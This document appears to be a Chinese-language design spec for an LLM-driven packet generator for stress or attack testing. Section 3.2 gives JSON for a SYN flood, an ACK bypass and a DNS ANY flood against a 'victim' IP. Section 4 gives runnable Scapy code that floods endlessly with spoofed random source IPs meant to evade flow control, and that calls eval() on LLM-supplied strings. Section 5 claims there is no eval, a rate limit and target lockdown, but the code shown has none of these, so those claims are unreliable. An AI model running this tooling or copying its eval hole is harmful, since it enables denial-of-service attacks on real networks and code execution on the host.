---

# # Adaptive Traffic Synthesis Engine (ATSE) Specification

## 1. 概述 (Overview)

本规范定义了一个**自适应流量合成引擎 (Adaptive Traffic Synthesis Engine, ATSE)** 的架构与数据交换标准。该系统作为智能体 (Agent) 的核心执行端，旨在解决传统测试工具只能发送固定协议/单调参数的问题。

系统采用 **“结构与控制分离”** 的设计哲学：

* **控制层 (Control Layer)**：由固定的 Python 实现，负责高性能发包、并发控制、多流混合比率调度及安全沙箱隔离。
* **结构层 (Structure Layer)**：由大语言模型 (LLM) 充当“乐高积木组装师”，根据受害者侧的业务流量分析结果，自主动态生成多协议交织的**流量描述 JSON (Traffic Description Specification)**。

---

## 2. 系统核心架构 (System Architecture)

```
┌────────────────────────────────────────────────────────┐
│                      智能体控制面                      │
│  [Traffic Analyzer] ──► [Planner Agent] ──► [LLM]     │
└───────────────────────────────────────────────────┬────┘
                                                    │ 动态输出
                                                    ▼ (Traffic Description JSON)
┌────────────────────────────────────────────────────────┐
│                   ATSE 核心发包引擎                    │
│  ┌──────────────────────┐   ┌──────────────────────┐   │
│  │     JSON Parser      │   │   Security Sandbox   │   │
│  └──────────┬───────────┘   └──────────┬───────────┘   │
│             │ 转换为 Scapy 对象        │ 动态阻断/校验 │   │
│             ▼                          ▼               │
│  ┌────────────────────────────────────────────────┐    │
│  │        Multi-Stream Rate-Limiter & Mixer       │    │
│  └────────────────────────┬───────────────────────┘    │
│                           │ 高性能发送 (Raw Socket / tcpreplay)
│                           ▼
│                  [ 目标受测试网络接口 ]                 │
└────────────────────────────────────────────────────────┘

```

---

## 3. 流量描述数据协议 (Traffic Description Protocol)

LLM 必须严格按照以下 JSON Schema 输出流量组合。该结构支持多流并发（Multi-Stream）、任意协议层级嵌套（Layer Topology）以及参数字段控制。

### 3.1 JSON Schema 规范

```json
{
  "$schema": "http://json-schema.org/draft-07/schema#",
  "title": "TrafficDescription",
  "type": "array",
  "items": {
    "type": "object",
    "required": ["stream_id", "protocol_stack", "fields", "percentage"],
    "properties": {
      "stream_id": {
        "type": "string",
        "description": "该流量流的唯一标识符"
      },
      "protocol_stack": {
        "type": "array",
        "items": { "type": "string" },
        "description": "自底向上的协议栈拓扑，例如 ['IP', 'TCP'] 或 ['IP', 'UDP', 'DNS']"
      },
      "fields": {
        "type": "object",
        "description": "对应协议栈中每层的特定字段赋值，键名必须与 Scapy 类属性严格一致",
        "additionalProperties": {
          "type": "object"
        }
      },
      "percentage": {
        "type": "integer",
        "minimum": 1,
        "maximum": 100,
        "description": "该流量流在整体混合流量中所占的带宽/数量百分比，所有 stream 的 percentage 总和必须为 100"
      }
    }
  }
}

```

### 3.2 典型复杂混合攻击示例 (Example)

当受害者侧表现出“开放 80/443、对单一口标高防、支持 HTTP/2”的特征时，LLM 生成的自适应混合流量描述：

```json
[
  {
    "stream_id": "malicious_syn_flood",
    "protocol_stack": ["IP", "TCP"],
    "fields": {
      "IP": {
        "dst": "192.168.10.5",
        "ttl": 64
      },
      "TCP": {
        "flags": "S",
        "dport": [80, 443],
        "options": [["MSS", 1460], ["NOP", null], ["WScale", 7]]
      }
    },
    "percentage": 50
  },
  {
    "stream_id": "malicious_ack_bypass",
    "protocol_stack": ["IP", "TCP"],
    "fields": {
      "IP": {
        "dst": "192.168.10.5"
      },
      "TCP": {
        "flags": "A",
        "dport": 80,
        "seq": 1000
      }
    },
    "percentage": 30
  },
  {
    "stream_id": "udp_amplification_mix",
    "protocol_stack": ["IP", "UDP", "DNS"],
    "fields": {
      "IP": {
        "dst": "192.168.10.5"
      },
      "UDP": {
        "dport": 53
      },
      "DNS": {
        "rd": 1,
        "qd": "DNSQR(qname='www.target-victim.com', qtype='ANY')"
      }
    },
    "percentage": 20
  }
]

```

---

## 4. 核心发包引擎实现指南 (Engine Implementation)

引擎通过解析上述标准 JSON，在内存中动态复现 Scapy 对象，并交由高性能循环驱动。

### 4.1 动态组装器（Parser 伪代码）

```python
from functools import reduce
import scapy.all as scapy

def parse_traffic_spec(json_config):
    compiled_streams = []
    total_percentage = sum(stream["percentage"] for stream in json_config)
    
    if total_percentage != 100:
        raise ValueError(f"Total percentage must be 100, current: {total_percentage}")

    for stream in json_config:
        layers = []
        for proto in stream["protocol_stack"]:
            proto_class = getattr(scapy, proto, None)
            if not proto_class:
                raise TypeError(f"Unsupported protocol layer: {proto}")
            
            # 获取该层 LLM 填入的参数
            proto_fields = stream["fields"].get(proto, {})
            
            # 特殊处理：解析嵌套的 Scapy 内部对象（如 DNSQR）
            processed_fields = {}
            for k, v in proto_fields.items():
                if isinstance(v, str) and v.startswith("DNSQR"):
                    processed_fields[k] = eval(f"scapy.{v}") # 可扩展更安全的解析器
                else:
                    processed_fields[k] = v
            
            # 实例化该协议层
            layers.append(proto_class(**processed_fields))
        
        # 使用 Scapy 的 / 运算符动态链接各层
        packet_template = reduce(lambda x, y: x / y, layers)
        compiled_streams.append({
            "packet": packet_template,
            "weight": stream["percentage"]
        })
        
    return compiled_streams

```

### 4.2 混合比率发送调度 (Mixer & Sender)

为了达到 LLM 指定的混合比率（如 50% SYN + 30% ACK + 20% UDP），发包引擎在底层采用加权随机抽样（Weighted Random Sampling）**或**轮询队列（Round-Robin Queue）将包压入网卡驱动。

```python
import random

def start_high_performance_sender(compiled_streams, socket_interface, duration=60):
    """
    基于编译好的流模板与权重，进行高性能混合发包
    """
    streams = [s["packet"] for s in compiled_streams]
    weights = [s["weight"] for s in compiled_streams]
    
    # 预加载到内存，避免循环内解析
    print("ATSE Engine: Traffic pre-compiled successfully. Injecting to interface...")
    
    # 高性能发送循环
    while True:
        # 根据 LLM 设定的权重百分比随机挑选当前发送的包模板
        pkt_to_send = random.choices(streams, weights=weights, k=1)[0]
        
        # 变异微调（例如动态修改 IP 层的随机源 IP 或 TCP 的随机源端口以绕过流控）
        pkt_to_send[scapy.IP].src = scapy.RandIP()._fix()
        if scapy.TCP in pkt_to_send:
            pkt_to_send[scapy.TCP].sport = random.randint(1024, 65535)
            
        # 使用底层 Raw Socket 发送二进制流以保证 PPS
        socket_interface.send(scapy.raw(pkt_to_send))

```

---

## 5. 安全与约束防护 (Guardrails & Security)

由于结构层完全交由 LLM 控制，控制层必须强制执行以下静态校验规则（布控于后端，非 Prompt 约束），防止智能体失控：

1. **目的 IP 强绑定 (Target Lockdown)**：
无论 LLM 填入的 `IP.dst` 是什么，后端引擎在发包前会强行将其重写（Overwrite）为当前授权测试的目标 IP，绝对不允许对未授权外网 IP 发包。
2. **禁止执行命令 (No Eval Injection)**：
JSON 字段中严禁包含 `__import__`、`os.system` 等敏感字符串。对于复杂的特殊子类（如 `DNSQR`），系统采用白名单正则解析，禁止直接对恶意输入的代码执行 `eval()`。
3. **最大限制带宽 (Rate-Limiting Guard)**：
控制层接收系统全局传入的 `MAX_PPS` 和 `MAX_BPS` 参数，作为硬性指标限制发包速率，防止压垮共享测试网络。